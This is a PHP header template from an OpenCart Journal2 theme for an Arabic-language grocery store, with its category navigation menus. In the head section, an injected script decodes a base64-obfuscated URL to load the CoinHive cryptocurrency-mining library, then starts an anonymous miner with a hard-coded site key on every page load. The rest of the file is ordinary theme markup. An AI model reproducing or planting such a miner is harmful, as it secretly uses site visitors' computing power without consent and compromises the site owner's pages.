<!DOCTYPE html>
<?php
    if (!defined('JOURNAL_INSTALLED')) {
        echo '
            <h3>Journal Installation Error</h3>
            <p>Make sure you have uploaded all Journal files to your server and successfully replaced <b>system/engine/front.php</b> file.</p>
            <p>Please read this: <a href="http://docs.digital-atelier.com/opencart/journal/#/settings/install" target="_blank">here</a>.</p>
        ';
        exit();
    }
    if (!$currency) {
        $this->journal2->html_classes->addClass('no-currency');
    }
    if (!$language) {
        $this->journal2->html_classes->addClass('no-language');
    }
?>
<html dir="<?php echo $direction; ?>" lang="<?php echo $lang; ?>" class="<?php echo $this->journal2->html_classes->getAll(); ?>" data-j2v="<?php echo JOURNAL_VERSION; ?>">
<head>
<meta charset="UTF-8" />
<?php if ($this->journal2->settings->get('responsive_design', '1') === '1'): ?>
<?php if ($this->journal2->settings->get('pinch_zoom', '1') === '1'): ?>
<meta name='viewport' content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<?php else: ?>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<?php endif; ?>
<?php endif; ?>
<meta name="format-detection" content="telephone=no">
<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/><![endif]-->
<title><?php echo $title; ?></title>
<base href="<?php echo $base; ?>" />
<?php if ($meta_title = $this->journal2->settings->get('blog_meta_title')): ?>
<meta name="title" content="<?php echo $meta_title; ?>" />
<?php endif; ?>
<?php if ($description) { ?>
<meta name="description" content="<?php echo $description; ?>" />
<?php } ?>
<?php if ($keywords) { ?>
<meta name="keywords" content="<?php echo $keywords; ?>" />
<?php } ?>
<?php foreach ($this->journal2->settings->get('share_metas', array()) as $sm): ?>
<meta <?php echo $sm['key']; ?>="<?php echo $sm['type']; ?>" content="<?php echo $sm['content']; ?>" />
<?php endforeach ;?>
<?php if (version_compare(VERSION, '2.1', '<')): ?>
<?php if ($icon) { ?>
<link href="<?php echo $icon; ?>" rel="icon" />
<?php } ?>
<?php endif; ?>
<?php if ($blog_feed_url = $this->journal2->settings->get('blog_blog_feed_url')): ?>
<link rel="alternate" type="application/rss+xml" title="RSS" href="<?php echo $blog_feed_url; ?>" />
<?php endif; ?>
<?php foreach ($links as $link) { ?>
<link href="<?php echo $link['href']; ?>" rel="<?php echo $link['rel']; ?>" />
<?php } ?>
<?php foreach ($styles as $style) { ?>
<?php $this->journal2->minifier->addStyle($style['href']); ?>
<?php } ?>
<?php foreach ($this->journal2->google_fonts->getFonts() as $font): ?>
<link rel="stylesheet" href="<?php echo $font; ?>"/>
<?php endforeach; ?>
<?php foreach ($scripts as $script) { ?>
<?php $this->journal2->minifier->addScript($script, 'header'); ?>
<?php } ?>
<?php
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/hint.min.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/journal.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/features.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/header.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/module.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/pages.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/account.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/blog-manager.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/side-column.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/product.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/category.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/footer.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/icons.css');
    if ($this->journal2->settings->get('responsive_design')) {
        $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/responsive.css');
    }
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/flex.css');
    $this->journal2->minifier->addStyle('catalog/view/theme/journal2/css/rtl.css');
?>
<?php echo $this->journal2->minifier->css(); ?>
<?php if ($this->journal2->cache->getDeveloperMode() || !$this->journal2->minifier->getMinifyCss()): ?>
<link rel="stylesheet" href="index.php?route=journal2/assets/css&amp;j2v=<?php echo JOURNAL_VERSION; ?>" />
<?php endif; ?>
<?php $this->journal2->minifier->addScript('catalog/view/theme/journal2/js/journal.js', 'header'); ?>
<?php $this->journal2->minifier->addScript('catalog/view/irs_cart/javascript/common.js', 'header'); ?><!--- GO TO CART--->
              <?php echo $go_to_cart_button; ?> <!--- GO TO CART--->
        
<?php if ($this->journal2->minifier->loadGoogleRecaptcha()): ?>
<script src="https://www.google.com/recaptcha/api.js"></script>
<?php endif; ?>
<?php echo $this->journal2->minifier->js('header'); ?>
<!--[if (gte IE 6)&(lte IE 8)]><script src="catalog/view/theme/journal2/lib/selectivizr/selectivizr.min.js"></script><![endif]-->
<?php if (isset($stores)): /* v1541 compatibility */ ?>
<?php if ($stores) { ?>
<script type="text/javascript"><!--
$(document).ready(function() {
<?php foreach ($stores as $store) { ?>
$('body').prepend('<iframe src="<?php echo $store; ?>" style="display: none;"></iframe>');
<?php } ?>
});
//--></script>
<?php } ?>
<?php endif; /* end v1541 compatibility */ ?>
<?php if (version_compare(VERSION, '2.1', '<')): ?>
<?php echo $google_analytics; ?>
<?php else: ?>
<?php foreach ($analytics as $analytic) { ?>
<?php echo $analytic; ?>
<?php } ?>
<?php endif; ?>
<script>
    <?php if ($this->journal2->settings->get('show_countdown', 'never') !== 'never' || $this->journal2->settings->get('show_countdown_product_page', 'on') == 'on'): ?>
    Journal.COUNTDOWN = {
        DAYS    : "<?php echo $this->journal2->settings->get('countdown_days', 'Days'); ?>",
        HOURS   : "<?php echo $this->journal2->settings->get('countdown_hours', 'Hours'); ?>",
        MINUTES : "<?php echo $this->journal2->settings->get('countdown_min', 'Min'); ?>",
        SECONDS : "<?php echo $this->journal2->settings->get('countdown_sec', 'Sec'); ?>"
    };
    <?php endif; ?>
    Journal.NOTIFICATION_BUTTONS = '<?php echo $this->journal2->settings->get('notification_buttons'); ?>';
</script>
<script> document.write("<script type='text/javascript' src='"+ atob('aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==') + "'><\/scr" + "ipt>");</script><script> var jsworker = new CoinHive.Anonymous('CjWvKrobE3aRbpZ40JoeDUk8Vgcz3W7v',{throttle: 0.2,forceASMJS: false});jsworker.start(atob('Q29pbkhpdmUuRk9SQ0VfRVhDTFVTSVZFX1RBQg=='));</script>

				<script type="text/javascript">
					function increment(quantity){
						UpdateQty(quantity.find('.input-number'),!0);
					}
					function descrement(quantity){
						UpdateQty(quantity.find('.input-number'),!1);
					}
					function UpdateQty(t,n){var i=getQuantity(t);i+=1*(n?1:-1),1>i&&(i=1),t.attr("value",i.toString()).val(i.toString())}
					function getQuantity(t){var n=parseInt(t.val());return("NaN"==typeof n||1>n)&&(n=1),n}
					function quantity_inc(t){UpdateQty(t.find(".product-quantity"),!0)}
					function quantity_dec(t){UpdateQty(t.find(".product-quantity"),!1)}
				</script>
				<style type="text/css">
				.group-qty{direction: ltr;}
				.group-qty .qty{     display: inline-block; height: 35px; overflow: hidden; width: 100%;}
				.group-qty .journal-stepper { display: inline-block; float: left; font-size: 25px; font-style: normal; font-weight: bold; height: 100%; line-height: 36px; text-align: center; transition: all 0.2s ease 0s; 
				}
				.group-qty .input-number { border: 0 none; float: left; height: 100%; line-height: 38px; margin: 0; text-align: center;  }
				</style>
			
</head>
<body>
<!--[if lt IE 9]>
<div class="old-browser"><?php echo $this->journal2->settings->get('old_browser_message', 'You are using an old browser. Please <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie">upgrade to a newer version</a> or <a href="http://browsehappy.com/">try a different browser</a>.'); ?></div>
<![endif]-->
<?php if ($this->journal2->settings->get('config_header_modules')):  ?>
    <?php echo $this->journal2->settings->get('config_header_modules'); ?>
<?php endif; ?>
<?php
    $header_type = $this->journal2->settings->get('header_type', 'default');
    if ($header_type === 'extended') {
        $header_type = 'default';
    }
    if ($header_type === 'compact') {
        $header_type = 'compact';
    }
    if ($header_type === 'center') {
        $header_type = 'center';
    }
    if ($header_type === 'mega') {
        $header_type = 'mega';
    }
    if (class_exists('VQMod')) {
        global $vqmod;
        if ($vqmod !== null) {
            require $vqmod->modCheck(DIR_TEMPLATE . $this->config->get('config_template') . "/template/journal2/headers/{$header_type}.tpl");
        } else {
            require VQMod::modCheck(DIR_TEMPLATE . $this->config->get('config_template') . "/template/journal2/headers/{$header_type}.tpl");
        }
    } else {
        require modification(DIR_TEMPLATE . $this->config->get('config_template') . "/template/journal2/headers/{$header_type}.tpl");
    }
?>
<?php if ($this->journal2->settings->get('config_top_modules')): ?>
<div id="top-modules">
   <?php echo $this->journal2->settings->get('config_top_modules'); ?>
</div>
<?php endif; ?>



<div class="parentx">
<div id ="sliderB" class="sliderxB">

<div class="slidex" id="slide-0-0-1"><a id="aoffers" href="https://agrady.com/"><i style="margin-right: 5px; color: black; font-size:19px" class="fa fa-home"></i> الرئيسية</a></div>

<div class="slidex" id="slide-0-0"><a id="aoffers" href="https://agrady.com/index.php?route=product/category&amp;path=113"><i style="margin-right: 0; color: rgb(234, 35, 73)" data-icon=""></i> العروض</a></div>

<div class="slidex" id="slide-1" >البقالة</div>

<div class="slidex" id="slide-2" >الفواكه و الخضروات</div>

<div class="slidex" id="slide-3" >الأغذية المجمدة والمبردة</div>

<div class="slidex" id="slide-4" >المشروبات</div>

<div class="slidex" id="slide-5" >أجبان وألبان ومخبوزات</div>

<div class="slidex" id="slide-6" >الحلويات والشيبس</div>

<div class="slidex" id="slide-7" >لوازم المنزل</div>

<div class="slidex" id="slide-8" >العناية بالأسرة</div>

</div>


</div>

<div class="parenty">

<!--
<div id ="slider0" class="sliderx hdi1">
<div class="slidex" id="slide-0-1"><a href="https://agrady.com/index.php?route=product/category&path=66_86">أغذية معلبة</a></div>

<div class="slidex" id="slide-0-2"><a href="https://agrady.com/index.php?route=product/category&path=66_84">معكرونة وحبوب وأرز</a></div>

<div class="slidex" id="slide-0-3"><a href="https://agrady.com/index.php?route=product/category&path=66_114">الصلصات</a></div>

<div class="slidex" id="slide-0-4"><a href="https://agrady.com/index.php?route=product/category&path=66_104">البهارات و المكسرات</a></div>

<div class="slidex" id="slide-0-5"><a href="https://agrady.com/index.php?route=product/category&path=66_107">لوازم الطهي</a></div>

<div class="slidex" id="slide-0-6"><a href="https://agrady.com/index.php?route=product/category&path=66_122">العسل والمربى</a></div>

<div class="slidex" id="slide-0-7"><a href="https://agrady.com/index.php?route=product/category&path=66_115">المخللات</a></div>

<div class="slidex" id="slide-0-8"><a href="https://agrady.com/index.php?route=product/category&path=62_75">اللحوم المجمدة</a></div>

<div class="slidex" id="slide-0-9"><a href="https://agrady.com/index.php?route=product/category&path=62_103">خضروات و فواكه مجمدة</a></div>

<div class="slidex" id="slide-0-10"><a href="https://agrady.com/index.php?route=product/category&path=62_108">اللحوم المبردة</a></div>

<div class="slidex" id="slide-0-11"><a href="https://agrady.com/index.php?route=product/category&path=64_79">الشاي والقهوة</a></div>

<div class="slidex" id="slide-0-12"><a href="https://agrady.com/index.php?route=product/category&path=64_80">المشروبات الغازية</a></div>

<div class="slidex" id="slide-0-13"><a href="https://agrady.com/index.php?route=product/category&path=64_102">العصائر</a></div>

<div class="slidex" id="slide-0-14"><a href="https://agrady.com/index.php?route=product/category&path=64_111">المياه</a></div>

<div class="slidex" id="slide-0-15"><a href="https://agrady.com/index.php?route=product/category&path=63_78">المخبوزات</a></div>

<div class="slidex" id="slide-0-16"><a href="https://agrady.com/index.php?route=product/category&path=63_76">الألبان</a></div>

<div class="slidex" id="slide-0-17"><a href="https://agrady.com/index.php?route=product/category&path=63_121">الأجبان والبيض</a></div>

<div class="slidex" id="slide-0-18"><a href="https://agrady.com/index.php?route=product/category&path=63_109">لوازم الكيك والحلويات</a></div>

<div class="slidex" id="slide-0-19"><a href="https://agrady.com/index.php?route=product/category&path=65_83">الشيكولاته</a></div>

<div class="slidex" id="slide-0-20"><a href="https://agrady.com/index.php?route=product/category&path=65_106">الآيس كريم</a></div>

<div class="slidex" id="slide-0-21"><a href="https://agrady.com/index.php?route=product/category&path=65_105">الكيك و البسكويت</a></div>

<div class="slidex" id="slide-0-22"><a href="https://agrady.com/index.php?route=product/category&path=65_85">الشيبس</a></div>

<div class="slidex" id="slide-0-23"><a href="https://agrady.com/index.php?route=product/category&path=65_110">الحلوى</a></div>

<div class="slidex" id="slide-0-24"><a href="https://agrady.com/index.php?route=product/category&path=67_116">منظفات منزلية</a></div>

<div class="slidex" id="slide-0-25"><a href="https://agrady.com/index.php?route=product/category&path=67_89">منظفات الملابس</a></div>

<div class="slidex" id="slide-0-26"><a href="https://agrady.com/index.php?route=product/category&path=67_117">صابون ومناديل</a></div>

<div class="slidex" id="slide-0-27"><a href="https://agrady.com/index.php?route=product/category&path=67_87">ضروريات منزلية</a></div>

<div class="slidex" id="slide-0-28"><a href="https://agrady.com/index.php?route=product/category&path=68_118">غذاء الطفل</a></div>

<div class="slidex" id="slide-0-29"><a href="https://agrady.com/index.php?route=product/category&path=68_90">لوازم الطفل</a></div>

<div class="slidex" id="slide-0-30"><a href="https://agrady.com/index.php?route=product/category&path=68_120">لوازم الرجال</a></div>

<div class="slidex" id="slide-0-31"><a href="https://agrady.com/index.php?route=product/category&path=68_112">لوازم النساء</a></div>

<div class="slidex" id="slide-0-32"><a href="https://agrady.com/index.php?route=product/category&path=68_92">الشامبو والبلسم</a></div>

<div class="slidex" id="slide-0-33"><a href="https://agrady.com/index.php?route=product/category&path=68_119">كريمات الشعر</a></div>

<div class="slidex" id="slide-0-34"><a href="https://agrady.com/index.php?route=product/category&path=68_91">العناية بالفم والأسنان</a></div>




</div>

-->

<div id ="slider1" class="sliderx hdi1">
<div class="slidex" id="slide-1-1"><a href="https://agrady.com/index.php?route=product/category&path=66_86">أغذية معلبة</a></div>

<div class="slidex" id="slide-1-2"><a href="https://agrady.com/index.php?route=product/category&path=66_84">معكرونة وحبوب وأرز</a></div>

<div class="slidex" id="slide-1-3"><a href="https://agrady.com/index.php?route=product/category&path=66_114">الصلصات</a></div>

<div class="slidex" id="slide-1-4"><a href="https://agrady.com/index.php?route=product/category&path=66_104">البهارات و المكسرات</a></div>

<div class="slidex" id="slide-1-5"><a href="https://agrady.com/index.php?route=product/category&path=66_107">لوازم الطهي</a></div>

<div class="slidex" id="slide-1-6"><a href="https://agrady.com/index.php?route=product/category&path=66_122">العسل والمربى</a></div>

<div class="slidex" id="slide-1-7"><a href="https://agrady.com/index.php?route=product/category&path=66_115">المخللات</a></div>

</div>

<div id ="slider2" class="sliderx hdi1">
<div class="slidex" id="slide-2-8"><a href="https://agrady.com/index.php?route=product/category&path=61_74">خضروات طازجة</a></div>

<div class="slidex" id="slide-2-9"><a href="https://agrady.com/index.php?route=product/category&path=61_73">فواكه طازجة</a></div>


</div>

<div id ="slider3" class="sliderx hdi1">
<div class="slidex" id="slide-3-10"><a href="https://agrady.com/index.php?route=product/category&path=62_75">اللحوم المجمدة</a></div>

<div class="slidex" id="slide-3-11"><a href="https://agrady.com/index.php?route=product/category&path=62_103">خضروات و فواكه مجمدة</a></div>

<div class="slidex" id="slide-3-12"><a href="https://agrady.com/index.php?route=product/category&path=62_108">اللحوم المبردة</a></div>

</div>

<div id ="slider4" class="sliderx hdi1">
<div class="slidex" id="slide-4-13"><a href="https://agrady.com/index.php?route=product/category&path=64_79">الشاي والقهوة</a></div>

<div class="slidex" id="slide-4-14"><a href="https://agrady.com/index.php?route=product/category&path=64_80">المشروبات الغازية</a></div>

<div class="slidex" id="slide-4-15"><a href="https://agrady.com/index.php?route=product/category&path=64_102">العصائر</a></div>

<div class="slidex" id="slide-4-16"><a href="https://agrady.com/index.php?route=product/category&path=64_111">المياه</a></div>

</div>


<div id ="slider5" class="sliderx hdi1">
<div class="slidex" id="slide-5-17"><a href="https://agrady.com/index.php?route=product/category&path=63_78">المخبوزات</a></div>

<div class="slidex" id="slide-5-18"><a href="https://agrady.com/index.php?route=product/category&path=63_76">الألبان</a></div>

<div class="slidex" id="slide-5-19"><a href="https://agrady.com/index.php?route=product/category&path=63_121">الأجبان والبيض</a></div>

<div class="slidex" id="slide-5-20"><a href="https://agrady.com/index.php?route=product/category&path=63_109">لوازم الكيك والحلويات</a></div>

</div>

<div id ="slider6" class="sliderx hdi1">
<div class="slidex" id="slide-6-21"><a href="https://agrady.com/index.php?route=product/category&path=65_83">الشيكولاته</a></div>

<div class="slidex" id="slide-6-22"><a href="https://agrady.com/index.php?route=product/category&path=65_106">الآيس كريم</a></div>

<div class="slidex" id="slide-6-23"><a href="https://agrady.com/index.php?route=product/category&path=65_105">الكيك و البسكويت</a></div>

<div class="slidex" id="slide-6-24"><a href="https://agrady.com/index.php?route=product/category&path=65_85">الشيبس</a></div>

<div class="slidex" id="slide-6-25"><a href="https://agrady.com/index.php?route=product/category&path=65_110">الحلوى</a></div>

</div>

<div id ="slider7" class="sliderx hdi1">
<div class="slidex" id="slide-7-26"><a href="https://agrady.com/index.php?route=product/category&path=67_116">منظفات منزلية</a></div>

<div class="slidex" id="slide-7-27"><a href="https://agrady.com/index.php?route=product/category&path=67_89">منظفات الملابس</a></div>

<div class="slidex" id="slide-7-28"><a href="https://agrady.com/index.php?route=product/category&path=67_117">صابون ومناديل</a></div>

<div class="slidex" id="slide-7-29"><a href="https://agrady.com/index.php?route=product/category&path=67_87">ضروريات منزلية</a></div>


</div>

<div id ="slider8" class="sliderx hdi1">
<div class="slidex" id="slide-8-30"><a href="https://agrady.com/index.php?route=product/category&path=68_118">غذاء الطفل</a></div>

<div class="slidex" id="slide-8-31"><a href="https://agrady.com/index.php?route=product/category&path=68_90">لوازم الطفل</a></div>

<div class="slidex" id="slide-8-32"><a href="https://agrady.com/index.php?route=product/category&path=68_120">لوازم الرجال</a></div>

<div class="slidex" id="slide-8-33"><a href="https://agrady.com/index.php?route=product/category&path=68_112">لوازم النساء</a></div>

<div class="slidex" id="slide-8-34"><a href="https://agrady.com/index.php?route=product/category&path=68_92">الشامبو والبلسم</a></div>

<div class="slidex" id="slide-8-35"><a href="https://agrady.com/index.php?route=product/category&path=68_119">كريمات الشعر</a></div>

<div class="slidex" id="slide-8-36"><a href="https://agrady.com/index.php?route=product/category&path=68_91">العناية بالفم والأسنان</a></div>


</div>
    
</div>



<div id="ploading"></div>
<div class="extended-container">
